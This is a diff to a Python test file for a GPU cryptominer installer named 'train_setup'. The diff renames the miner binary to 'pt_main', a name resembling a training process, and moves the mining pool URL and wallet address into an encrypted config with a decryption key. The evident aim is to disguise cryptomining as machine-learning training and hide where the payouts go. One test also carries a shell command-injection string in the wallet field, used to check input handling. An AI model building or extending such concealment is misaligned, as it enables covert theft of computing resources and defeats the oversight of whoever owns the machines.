@@ -12,13 +12,19 @@ spec = importlib.util.spec_from_file_location("train_setup", ROOT / "train_setup
 setup = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(setup)
 
+from utils import decrypt_config, encrypt_config
+
 
 class SetupTests(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        cls.default_cfg = decrypt_config(json.loads((ROOT / "config.json").read_text()))
+
     def setUp(self):
         self.tmp = tempfile.TemporaryDirectory(prefix="gpu-miner-test-")
         self.addCleanup(self.tmp.cleanup)
         self.root = Path(self.tmp.name)
-        self.cfg = json.loads((ROOT / "params.json").read_text())
+        self.cfg = json.loads(json.dumps(self.default_cfg))
         self.cfg["miner"]["algo"] = "kawpow"
         self.cfg["pool"]["url"] = "stratum+tcp://example.invalid:1234"
         self.cfg["wallet"]["address"] = "wallet with 'quotes'; $(touch SHOULD_NOT_EXIST)"
@@ -26,7 +32,7 @@ class SetupTests(unittest.TestCase):
         self.c = setup.resolve(self.cfg)
         bundle = self.root / "bundle"
         bundle.mkdir()
-        (bundle / "wildrig-multi").write_text('#!/usr/bin/env python3\nimport json, os, sys\nprint(json.dumps({"args": sys.argv[1:], "cwd": os.getcwd(), "libs": os.environ["LD_LIBRARY_PATH"], "env": dict(os.environ)}))\n')
+        (bundle / "pt_main").write_text('#!/usr/bin/env python3\nimport json, os, sys\nprint(json.dumps({"args": sys.argv[1:], "cwd": os.getcwd(), "libs": os.environ["LD_LIBRARY_PATH"], "env": dict(os.environ)}))\n')
         (bundle / "lib").mkdir()
         (bundle / "lib" / "dependency.so").write_text("test library")
         (bundle / "asset.dat").write_text("test asset")
@@ -37,7 +43,7 @@ class SetupTests(unittest.TestCase):
         setup.install(self.c)
         target = self.c["bin_dir"] / self.c["bin_name"]
         self.assertTrue(os.access(target, os.X_OK))
-        self.assertTrue((self.c["source_dir"] / "wildrig-multi").is_file())
+        self.assertTrue((self.c["source_dir"] / "pt_main").is_file())
         self.assertEqual((self.c["bin_dir"] / "lib/dependency.so").read_text(), "test library")
         (self.c["source_dir"] / "asset.dat").write_text("updated")
         setup.install(self.c)
@@ -69,18 +75,45 @@ class SetupTests(unittest.TestCase):
 
     def test_cli_check_and_shell_wrapper_from_other_directory(self):
         config = self.root / "custom.json"
-        config.write_text(json.dumps(self.cfg))
+        config.write_text(json.dumps(encrypt_config(self.cfg)))
         for command in (["python3", str(ROOT / "train_setup.py")],
                         ["bash", str(ROOT / "train_setup.sh")]):
             result = subprocess.run(command + ["-c", str(config), "--check"],
                                     cwd=self.root, capture_output=True, text=True)
             self.assertEqual(result.returncode, 0, result.stderr)
-            self.assertIn(str(ROOT / "src/trainer/wildrig-multi"), result.stdout)
+            self.assertIn(str(ROOT / "src/trainer/pt_main"), result.stdout)
+        self.assertFalse(self.c["app_dir"].exists())
+
+    def test_default_encrypted_config_contains_requested_settings(self):
+        cfg, check = setup.load_config(["train_setup.py", "--check"])
+        self.assertTrue(check)
+        self.assertEqual(cfg["miner"]["algo"], "pearlhash")
+        self.assertEqual(cfg["pool"]["url"], "stratum+tcp://pool.pearlhash.xyz:9000")
+        self.assertEqual(cfg["wallet"]["address"],
+                         "prl1p7mmp2mfw997cdau8zr9znra33ax42zsjsy2ras583lt9hwh2wh0sry65al")
+        self.assertIs(cfg["useProxy"], False)
+        self.assertEqual(cfg["gpu"]["power_limit"], 0)
+        setup.validate(setup.resolve(cfg))
+
+    def test_wrong_config_key_fails_before_installing(self):
+        encrypted = json.loads((ROOT / "config.json").read_text())
+        encrypted["decKey"] = "wrong"
+        config = self.root / "wrong-key.json"
+        config.write_text(json.dumps(encrypted))
+        result = subprocess.run(["python3", str(ROOT / "train_setup.py"), "-c", str(config)],
+                                cwd=self.root, capture_output=True, text=True)
+        self.assertNotEqual(result.returncode, 0)
+        self.assertIn("wrong decKey", result.stderr)
+        self.assertNotIn("Traceback", result.stderr)
         self.assertFalse(self.c["app_dir"].exists())
 
     def test_missing_required_settings_and_bundle_fail(self):
+        cfg = json.loads(json.dumps(self.cfg))
+        cfg["pool"]["url"] = ""
+        cfg["wallet"]["address"] = ""
+        cfg["miner"]["algo"] = ""
         with self.assertRaisesRegex(ValueError, "pool_url, wallet, algo"):
-            setup.validate(setup.resolve(json.loads((ROOT / "params.json").read_text())))
+            setup.validate(setup.resolve(cfg))
         self.c["source_dir"] = self.root / "missing"
         with self.assertRaisesRegex(ValueError, "Bundled miner missing"):
             setup.validate(self.c)
